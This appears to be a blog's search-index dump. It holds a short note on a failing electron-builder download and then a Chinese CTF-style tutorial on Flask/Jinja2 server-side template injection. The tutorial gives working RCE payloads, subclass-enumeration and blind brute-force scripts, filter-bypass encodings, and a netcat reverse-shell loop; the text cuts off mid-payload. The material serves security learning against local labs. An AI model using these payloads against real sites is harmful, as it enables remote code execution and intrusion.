after a period of time, or established connection failed because connected host has failed to respond.                     attempt=0                     waitTime=2 • cannot get, wait  error=Get &quot;https://service.electron.build/find-build-agent?no-cache=1it6rqj&quot;: dial tcp 51.15.76.176:443: connectex: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond.                     attempt=1                     waitTime=4 • cannot get, wait  error=Get &quot;https://service.electron.build/find-build-agent?no-cache=1it6rqj&quot;: dial tcp 51.15.76.176:443: connectex: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond.                     attempt=2                     waitTime=6 ⨯ Get &quot;https://service.electron.build/find-build-agent?no-cache=1it6rqj&quot;: dial tcp 51.15.76.176:443: connectex: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond.\nwin跨平台构建linux从service.electron.build下载资源失败，换代理也没用\n原因这个站点service.electron.build似乎在2020年就关闭，一直也没人来修这个玩意\n解决换linux主机构建或者采用docker的容器进行构建ISSUES:https://github.com/electron-userland/electron-build-service/issues/9\n","categories":["问题解决"],"tags":["问题解决","Vue3","Electron"]},{"title":"WEB-Flask模板注入总结","url":"/2025/07/02/WEB-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/","content":"环境创建conda create -n flask python=3.11conda activate flaskpip install flask\n\n关于flaskFlask是一个使用python编写的轻量级的Web应用框架，其WSGI工具采用werkzeug，模板引擎使用jinja2，后面的ssti基本都围绕这flask进行。\n简单案例下面简单的创建一个flask应用\nfrom flask import Flaskapp = Flask(__name__)# 路由@app.route(&quot;/&quot;)def hello_world():    return &quot;Hello, World!&quot;if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n此时用flask的环境去运行，会自动监在本地的5000端口，去访问会回显Hello，World\n参数传入传参的方法有很多种，这里简单列举几个比较常用的，代码如下\nfrom flask import Flask, requestapp = Flask(__name__)@app.route(&quot;/&quot;)def hello_world():    return &quot;Hello, World!&quot;# 动态URL传参 字符串@app.route(&quot;/hello/&lt;name&gt;&quot;)def hello_name(name):    return f&quot;Hello, &#123;name&#125;!&quot;# 动态URL传参 int@app.route(&quot;/int/&lt;int:id&gt;&quot;)def int_id(id):    return f&quot;int, &#123;id&#125;!&quot;# 动态URL传参 float@app.route(&quot;/float/&lt;float:id&gt;&quot;)def float_id(id):    return f&quot;float, &#123;id&#125;!&quot;# form传参@app.route(&quot;/post_get&quot;, methods=[&quot;POST&quot;, &quot;GET&quot;])def post_get_id():    if request.method == &quot;GET&quot;:        id = request.args.get(&quot;id&quot;)        return f&quot;GET, &#123;id&#125;!&quot;    id = request.form[&quot;id&quot;]    return f&quot;POST, &#123;id&#125;!&quot;if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n关于模板模板是为了将视图函数的业务逻辑和HTML 页面展示代码分离，提高代码的可维护性和可读性。通过使用模板引擎(Jinja2)，可以将动态数据插入到预定义的HTML 模板中，生成最终的HTML 页面，避免在视图函数中直接拼接HTML 字符串，从而使代码更加清晰和易于维护。﻿有些需求可能需要一个框架把前后端都写了，一般这种就需要使用模板了，下面进行模板的讲解，后面的模板注入也都是围绕这这个块内容进行的。在当前目录下创建一个templates的目录，flask的模板载入默认就是用当前工作目录的template下的文件，写一个index.html，内容如下\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;  &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot; /&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;    &lt;title&gt;Template&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;h1&gt;模板展示页&lt;/h1&gt;    &lt;h2&gt;字符串类型&lt;/h2&gt;    &lt;p&gt;&#123;&#123;my_str&#125;&#125;&lt;/p&gt;    &lt;h2&gt;整型&lt;/h2&gt;    &lt;p&gt;&#123;&#123;my_int&#125;&#125;&lt;/p&gt;    &lt;h2&gt;数组&lt;/h2&gt;    &lt;p&gt;&#123;&#123;my_array&#125;&#125;&lt;/p&gt;    &lt;p&gt;&#123;&#123;my_array[0]&#125;&#125;&lt;/p&gt;    &lt;p&gt;&#123;&#123;my_array[2]&#125;&#125;&lt;/p&gt;    &lt;h2&gt;字典&lt;/h2&gt;    &lt;p&gt;name:&#123;&#123;my_dict.name&#125;&#125;&lt;/p&gt;    &lt;p&gt;age:&#123;&#123;my_dict.age&#125;&#125;&lt;/p&gt;  &lt;/body&gt;&lt;/html&gt;\n然后运行下面代码\nfrom flask import Flask, render_templateapp = Flask(__name__)@app.route(&quot;/&quot;)def hello_world():    my_str = &quot;hello template&quot;    my_int = 12    my_array = [1, 2, 3, 4, 5]    my_dict = &#123;&quot;name&quot;: &quot;moban&quot;, &quot;age&quot;: 18&#125;    return render_template(        &quot;index.html&quot;, my_str=my_str, my_int=my_int, my_array=my_array, my_dict=my_dict    )if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n此时访问返回的内容如下\n漏洞介绍模板注入漏洞简称SSTI，以flask为例，如果代码不严谨造成此漏洞可能会导致造成任意文件读取和RCE，漏洞的成因一般都是在渲染模板的时候没有严格对用户的输入做控制，或者使用了危险的模板导致用户可以和flask程序进行交互。下面看一个安全的代码\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    str = request.args.get(&quot;str&quot;)    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;&#123;&#123;str&#125;&#125;&lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;    return render_template_string(html_str, str=str)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n这里进行输入任何的数据都不会进行计算，而是直接进行渲染，可以尝试参数7*7，后面看一个有问题的代码\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    str = request.args.get(&quot;str&quot;)    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;&#123;0&#125;&lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;.format(        str    )    return render_template_string(html_str)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n这个代码会因为输入的数据而直接修改模板，然后再最终会被模板加载，如果我们在修改模板的时候注入一些计算，例如payload&#123;&#123;7*7&#125;&#125;那么他会直接返回47，这个位置就存在模板注入漏洞。也可以通过下面payload来测试指令的执行&#123;&#123;''.__class__.__mro__&#125;&#125;\n简单利用在仔细学习flask的ssti前，先学习一下python的类继承关系，后面利用漏洞的时候可以方便理解一些小技巧。首先在代码中写入下面内容\nclass A:    passclass B(A):    passclass C(B):    passclass D(B):    passc = C()# 当前类print(&quot;C的当前类:&quot;, c.__class__)# 父类print(&quot;C的父类:&quot;, c.__class__.__base__)print(&quot;B的父类:&quot;, c.__class__.__base__.__base__)print(&quot;A的父类:&quot;, c.__class__.__base__.__base__.__base__)# 直接获取父类链(可以当数组用)print(&quot;C的父类链:&quot;, C.__mro__)# 查看子类print(&quot;通过C查看B的所有子类:&quot;, C.__mro__[1].__subclasses__())\n这些方法的作用如下\n__class__ # 查找当前类型的所属对象__base__  # 查找自己的父类__mro__   # 查找父类链__subclasses__ # 查看当前类下的所有子类\n学习了这些内容之后我们可以看一个存在漏洞的案例，代码如下\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    str = request.args.get(&quot;str&quot;)    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;&#123;0&#125;&lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;.format(        str    )    return render_template_string(html_str)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n我们可以尝试获取一下最父类object看一下可以用来执行命令的子类，payload可以用str=&#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125;含义是获取字符串类string的父类object下的所有子类，然后他会列出很多很多的数据这些数据我们复制出来替换一下,为换行，我们就可以直观的知道他们每一个的数组索引，然后我们在148行发现下面这个类os._wrap_close这个类可以执行命令还有执行代码，一般都会存在这个，索引不固定，但是有些题目可能会禁用掉，这个就得考虑别的了，我们可以使用下面payload获取到这个类str=&#123;&#123;''.__class__.__base__.__subclasses__()[147]&#125;&#125;，147的原因是因为python默认是从0计算索引的，vsc中是从1开始，然后我们可以通过下面的payload来查看一下他是否已经被初始化了str=&#123;&#123;''.__class__.__base__.__subclasses__()[147].__init__&#125;&#125;返回出一个地址即成功，如果是其他的那就说明不能直接使用。继续的我们看一下这个类中所有可用的方法和变量，通过下面payload获取\nstr=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[147].__init__.__globals__&#125;&#125;\n同样的返回值会是一大片数据他这里返回数据的方式是字典，我们一般直接去搜索system、eval、popen这些比较危险的函数试试，如果有我们这里可以直接使用，例如eval的使用，payload如下\nstr=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[147].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;\n\n常用模块文件读取文件读取用的object的子类是_frozen_importlib_external.FileLoader，简单的利用payload如下\nstr=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[索引][&quot;get_data&quot;](0,&quot;flag&quot;)&#125;&#125;\n\neval命令执行参考上面简单利用的案例，需要用到的是os._wrap_close类，这里给一个payload\nstr=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[索引].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;\nos命令执行直接调用os模块可以使用下面的payload\n&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;&#123;&#123;url_for.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;\n还有其他的方式，其他的主要是通过加载过os模块的类去使用os模块，下面也简单介绍一下，以简单利用的环境为例，编写下面脚本来寻找os.py模块\nimport requestsurl = &quot;http://127.0.0.1:5000/&quot;for i in range(500):    data = &#123;        &quot;str&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;        + str(i)        + &quot;].__init__.__globals__&#125;&#125;&quot;    &#125;    response = requests.get(url, params=data)    # response = requests.post(url, params=data)    if response.status_code == 200:        if &quot;os.py&quot; in response.text:            print(i)            break\n相同的这个脚本也适用于寻找其他模块，具体利用可以直接拼接os模块即可，如下payload\nstr=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[索引].__init__.__globals__.os.popen(&#x27;dir&#x27;)&#125;&#125;\nPS：有些模块似乎无法使用，了解当前方法即可。\nimportlib命令执行这个需要利用_frozen_importlib.BuiltinImporter模块，一般他可以直接在objsct的子类中存在，具体利用payload如下\nstr=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[索引][&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;dir&quot;).read()&#125;&#125;\nlinecache命令执行linecache函数可以用来读取任意一个文件的某一行，而且他也引入了os模块，我们可以直接利用他去执行命令，他也是需要去搜索的，具体脚本如下\nimport requestsurl = &quot;http://127.0.0.1:5000/&quot;for i in range(500):    data = &#123;        &quot;str&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;        + str(i)        + &quot;].__init__.__globals__&#125;&#125;&quot;    &#125;    response = requests.get(url, params=data)    # response = requests.post(url, params=data)    if response.status_code == 200:        if &quot;linecache&quot; in response.text:            print(i)            break\n具体利用payload如下\n&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[索引].__init__.__globals__.linecache.os.popen(&quot;whoami&quot;).read()&#125;&#125;\nsubprocess命令执行从python2.4开始，就可以使用subprocess这个模块来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。他的产生似乎是为了替代其他几个老模块和函数产生的，比如os.system、os.popen等函数。他的查找方式可以直接参考简单利用的方式，模块名字是subprocess.Popen，利用payload如下\n&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[541](&#x27;whoami&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;\n双括弧绕过有些题目可能会把&#123;&#123;`和`&#125;&#125;过滤，或者是通过正则的形式给这俩过滤掉，题目代码如下\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)def filter_ssti(input_str):    if input_str and (&quot;&#123;&#123;&quot; in input_str or &quot;&#125;&#125;&quot; in input_str):        return &quot;hack!&quot;    return input_str@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    raw_str = request.args.get(&quot;str&quot;, &quot;&quot;)    filtered_str = filter_ssti(raw_str)    if filtered_str == &quot;hack!&quot;:        return filtered_str, 400    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;&#123;0&#125;&lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;.format(        filtered_str    )    return render_template_string(html_str)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n这里只要存在&#123;&#123;`和`&#125;&#125;输入都会触发hack，这里我们需要学习一下jinja2的逻辑渲染，具体的源码可以参考下面模板\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;  &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot; /&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;    &lt;title&gt;SSTI&lt;/title&gt;    &lt;style&gt;      .red &#123;        color: red;      &#125;    &lt;/style&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;ul&gt;      &#123;% for girl in girls %&#125; &#123;%if girl | length &gt;= 3 %&#125;      &lt;li class=&quot;red&quot;&gt;&#123;&#123; girl &#125;&#125;&lt;/li&gt;      &#123;% else %&#125;      &lt;li&gt;&#123;&#123; girl &#125;&#125;&lt;/li&gt;      &#123;% endif %&#125; &#123;% endfor %&#125;    &lt;/ul&gt;  &lt;/body&gt;&lt;/html&gt;\n然后用下面python代码去渲染他\nfrom flask import Flask, render_templateapp = Flask(__name__)@app.route(&quot;/&quot;)def show1():    girls = [&quot;小丽&quot;, &quot;王小丽&quot;, &quot;小红&quot;, &quot;王小红&quot;, &quot;小美&quot;, &quot;小芳&quot;]    return render_template(&quot;luoji.html&quot;, girls=girls)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n返回如下上面是一个简单的使用，如果要利用到刚才的题目中可以尝试一个这样的payload\n&#123;%if 2&gt;1%&#125;Test&#123;%endif%&#125;\n这里会直接显示Test，这里我们就可以尝试一下盲注的思路，回显的方法后面会说，大致思路可以参考下面payload\n&#123;% if &#x27;&#x27;.__class__ %&#125; Test &#123;% endif %&#125;\n如果Test返回了，那么就说明&#39;&#39;.__class__存在数据，那么我们可以直接尝试下面脚本进行爆破\nimport requestsurl = &quot;http://127.0.0.1:5000/&quot;for i in range(500):    data = &#123;        &quot;str&quot;: &quot;&#123;% if &#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;        + str(i)        + &quot;].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\\&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()\\&quot;) %&#125;Test&#123;%endif%&#125;&quot;    &#125;    response = requests.get(url, params=data)    # response = requests.post(url, params=data)    if &quot;Test&quot; in response.text:        print(data)        break\n如果有回显，那么说明执行成功，我这里回显\n&#123;&#x27;str&#x27;: &#x27;&#123;% if \\&#x27;\\&#x27;.__class__.__base__.__subclasses__()[104].__init__.__globals__[\\&#x27;__builtins__\\&#x27;][\\&#x27;eval\\&#x27;](&quot;__import__(\\&#x27;os\\&#x27;).popen(\\&#x27;dir\\&#x27;).read()&quot;) %&#125;Test&#123;%endif%&#125;&#x27;&#125;\n提取出的payload如下，尝试之后会发现返回Test\n&#123;% if &#x27;&#x27;.__class__.__base__.__subclasses__()[104].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;) %&#125;Test&#123;%endif%&#125;\n这个时候可以通过下面payload进行回显数据\n&#123;% print(&#x27;&#x27;.__class__.__base__.__subclasses__()[104].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)) %&#125;\n结果如下\n无回显绕过无回显绕过题目如下\nfrom flask import Flask, request, render_template, render_template_stringapp = Flask(__name__)@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def template():    template = request.args.get(&quot;str&quot;)    if not template:        return &quot;ERROR&quot;    try:        result = render_template_string(template)        return result    except Exception as e:        return &quot;ERROR&quot;if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n一般这种题目三个思路，反弹shell、外带注入(dnslog)、盲注爆破(需要依赖回显)，思路其实都是依赖爆破的形式，例如下面反弹shell的脚本\nimport requestsurl = &#x27;http://127.0.0.1:5000&#x27;for i in range(0, 500):    data = &#123;&#x27;code&#x27;: &#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27; + str(i) + &#x27;].__init__.__globals__[&quot;popen&quot;](&quot;netcat 192.168.13.122 7788 -e /bin/bash&quot;).read() &#125;&#125;&#x27;&#125;    try:                                                                                   res = requests.post(url, data=data)    except:        pass\n直接爆破的可以参考双括弧绕过的那个脚本，需要简单修改，根据回显或者时间判断是否对。思路也可以参考sql注入的盲注爆破。例如下面爆破的脚本\nimport requestsurl = &quot;http://127.0.0.1:5000/&quot;def check(payload):    data = &#123;&quot;str&quot;: payload&#125;    response = requests.get(url, params=data)    if &quot;True&quot; in response.text:        return True    return Falseflag = &quot;&quot;for i in range(100):    for c in range(32, 127):        payload = f&quot;&#123;&#123;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()[&#123;i&#125;:&#123;i+1&#125;]==&#x27;&#123;chr(c)&#125;&#x27;&#125;&#125;&#125;&#125;&quot;        # print(payload)        if check(payload):            flag += chr(c)            print(f&quot;Current flag: &#123;flag&#125;&quot;)\n可以根据情况自行修改脚本。\n中括号过滤绕过getitem是python的一个魔术方法，和之前获取父类的拿一些内容都是一回事，然后getitem的作用是对字典使用时，传入字符串，返回自带你响应键所对应的值，当对列表使用时，传入整数返回列表对应索引值。简单的示例如下\nclass test:    def __init__(self):        self.a = &#123;&quot;1&quot;: &quot;大壮&quot;, &quot;2&quot;: &quot;小明&quot;, &quot;3&quot;: &quot;小红&quot;&#125;    def __getitem__(self, key):        b = self.a[key]        return bt = test()print(t[&quot;2&quot;])\n下面在看一道例题，就是不允许使用中括号，代码如下\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)def filter_ssti(input_str):    if input_str and (&quot;[&quot; in input_str or &quot;]&quot; in input_str):        return &quot;hack!&quot;    return input_str@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    raw_str = request.args.get(&quot;str&quot;, &quot;&quot;)    filtered_str = filter_ssti(raw_str)    if filtered_str == &quot;hack!&quot;:        return filtered_str, 400    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;&#123;0&#125;&lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;.format(        filtered_str    )    return render_template_string(html_str)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n下面用这个payload会发现出现问题(os._wrap_close办法)\nstr=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[147].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;\n出问题的位置是在使用[147]这个索引的地方，这个时候就可以通过__getitem__进行绕过，payload可以修改成下面这样\nstr=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(147).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;eval&#x27;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;\n就可以直接运行了\n单双引号过滤绕过简单看一道例题，代码如下\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)def filter_ssti(input_str):    if input_str and (&quot;&#x27;&quot; in input_str or &#x27;&quot;&#x27; in input_str):        return &quot;hack!&quot;    return input_str@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    raw_str = request.args.get(&quot;str&quot;, &quot;&quot;)    filtered_str = filter_ssti(raw_str)    if filtered_str == &quot;hack!&quot;:        return filtered_str, 400    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;&#123;0&#125;&lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;.format(        filtered_str    )    return render_template_string(html_str)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n这道题目不允许使用单引号和双引号，这种就无法直接通过一个参数进行传参，这种的解决方案就是从外部再次传参，需要传参的位置通过额外的其他方法进行传参，例如使用flask自带的request这个对象来获取其他各种形式的传参，具体比较常用的如下\nrequest.args.key  # 获取get传入的key值request.values.x1 # 所有参数request.cookies   # 获取cookies传入的值request.headers   # 获取请求头参数request.from.key  # 获取post传入的参数(type需要等于form的数据)request.data      # 获取post传入的参数(type需要等于其他的)request.json      # 获取post传入的json参数(type需要等于json)\n下面简单利用get传参的形式进行绕过，原本的payload如下\nstr=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(147).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;eval&#x27;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;\n采用get传参绕过的形式如下\nstr=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(147).__init__.__globals__.__getitem__(request.args.a).__getitem__(request.args.b)(request.args.c)&#125;&#125;&amp;a=__builtins__&amp;b=eval&amp;c=__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()\n\n下划线过滤绕过在flask的模板渲染的时候有很多的过滤器，这些先列举一下，然后后面给一个案例使用一下，常用过滤器如下\nlength()  # 获取一个序列或者自带你的长度，并返回值int()     # 将值转换为int类型float()   # 将值转换为float类型lower()   # 将字符串转换为小写upper()   # 将字符串转换为大写reverse() # 反转字符串replace(value,old,new) # 将value中的old替换成newlist()    # 将变量转换为列表类型string()  # 将变量转换成字符串类型join()    # 将一个序列中的参数值拼接成字符串，通常有python内置的dict()配合使用attr()    # 获取对象的属性\n下面看一段代码来简单的使用一下这些过滤器\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    str = request.args.get(&quot;str&quot;)    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;            upper:&#123;&#123;str|upper&#125;&#125;            &lt;br&gt;            upper-lower:&#123;&#123;str|upper|lower&#125;&#125;            &lt;br&gt;            attr:&#123;&#123;()|attr(&#x27;__class__&#x27;)&#125;&#125;        &lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;    return render_template_string(html_str, str=str)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n过滤器的用法是直接在数据后面套|，然后拼接对应的过滤器，这段代码传入下面payload\nstr=ls\n返回值如下好，我们知道过滤的用法之后我们看一道例题，代码如下\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)def filter_ssti(input_str):    if input_str and (&quot;_&quot; in input_str):        return &quot;hack!&quot;    return input_str@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    raw_str = request.args.get(&quot;str&quot;, &quot;&quot;)    filtered_str = filter_ssti(raw_str)    if filtered_str == &quot;hack!&quot;:        return filtered_str, 400    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;&#123;0&#125;&lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;.format(        filtered_str    )    return render_template_string(html_str)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n这道题目是不允许传输_这个字符，之前学的payload都是需要用过魔术方法(一般都会有_)进行做攻击的，这里肯定是没有办法，但是可以通过attr+request的方式进行绕过，原始payload如下\nstr=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(147).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;eval&#x27;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;\n通过attr+request的方法绕过_过滤之后的payload如下\nstr=&#123;&#123;&#x27;&#x27;|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(147)|attr(request.args.e)|attr(request.args.f)|attr(request.args.g)(request.args.h)|attr(request.args.i)(&#x27;eval&#x27;)(request.args.j)&#125;&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=__getitem__&amp;h=__builtins__&amp;i=__getitem__&amp;j=__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()\n然后除了过滤器之外还可以使用下面的几种方法和payload进行绕过unicode编码也可以绕过，对应的payload如下\nstr=&#123;&#123;&#x27;&#x27;|attr(&quot;\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0062\\u0061\\u0073\\u0065\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0073\\u0075\\u0062\\u0063\\u006c\\u0061\\u0073\\u0073\\u0065\\u0073\\u005f\\u005f&quot;)()|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(147)|attr(&quot;\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(&quot;\\u005f\\u005f\\u0062\\u0075\\u0069\\u006c\\u0074\\u0069\\u006e\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(&#x27;eval&#x27;)(&quot;\\u005f\\u005f\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u005f\\u005f\\u0028\\u0027\\u006f\\u0073\\u0027\\u0029\\u002e\\u0070\\u006f\\u0070\\u0065\\u006e\\u0028\\u0027\\u0064\\u0069\\u0072\\u0027\\u0029\\u002e\\u0072\\u0065\\u0061\\u0064\\u0028\\u0029&quot;)&#125;&#125;\n16进制编码绕过也可以，对应的payload如下\nstr=&#123;&#123;&#x27;&#x27;|attr(&quot;\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f&quot;)|attr(&quot;\\x5f\\x5f\\x62\\x61\\x73\\x65\\x5f\\x5f&quot;)|attr(&quot;\\x5f\\x5f\\x73\\x75\\x62\\x63\\x6c\\x61\\x73\\x73\\x65\\x73\\x5f\\x5f&quot;)()|attr(&quot;\\x5f\\x5f\\x67\\x65\\x74\\x69\\x74\\x65\\x6d\\x5f\\x5f&quot;)(147)|attr(&quot;\\x5f\\x5f\\x69\\x6e\\x69\\x74\\x5f\\x5f&quot;)|attr(&quot;\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f&quot;)|attr(&quot;\\x5f\\x5f\\x67\\x65\\x74\\x69\\x74\\x65\\x6d\\x5f\\x5f&quot;)(&quot;\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f&quot;)|attr(&quot;\\x5f\\x5f\\x67\\x65\\x74\\x69\\x74\\x65\\x6d\\x5f\\x5f&quot;)(&#x27;eval&#x27;)(&quot;\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;\nbase64也可以进行绕过，但是python3已经不可以使用了，这里就不演示了，遇到这种可以现搜。格式化字符串的形式也可以绕过，通过格式化_来绕过，对应的payload如下\nstr=&#123;&#123;&#x27;&#x27;|attr(&quot;%c%cclass%c%c&quot;%(95,95,95,95))|attr(&quot;%c%cbase%c%c&quot;%(95,95,95,95))|attr(&quot;%c%csubclasses%c%c&quot;%(95,95,95,95))()|attr(&quot;%c%cgetitem%c%c&quot;%(95,95,95,95))(147)|attr(&quot;%c%cinit%c%c&quot;%(95,95,95,95))|attr(&quot;%c%cglobals%c%c&quot;%(95,95,95,95))|attr(&quot;%c%cgetitem%c%c&quot;%(95,95,95,95))(&quot;%c%cbuiltins%c%c&quot;%(95,95,95,95))|attr(&quot;%c%cgetitem%c%c&quot;%(95,95,95,95))(&#x27;eval&#x27;)(&quot;%c%cimport%c%c(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;%(95,95,95,95))&#125;&#125;\n需要注意的是这里%c可能会被识别成url编码导致解析失败，最好url转一下\nstr=%7B%7B%27%27%7C